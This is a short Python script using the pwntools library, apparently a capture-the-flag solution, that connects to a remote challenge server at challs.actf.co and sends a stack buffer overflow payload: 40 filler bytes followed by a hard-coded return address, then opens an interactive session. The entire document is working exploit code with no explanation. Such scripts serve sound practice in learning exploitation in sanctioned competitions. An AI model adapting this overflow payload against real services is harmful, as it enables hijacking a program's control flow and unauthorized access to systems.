from pwn import *

p = remote("challs.actf.co", 31224)

payload =b"A"*40
payload += p64(0x000000000040123b)

p.sendline(payload)

p.interactive()
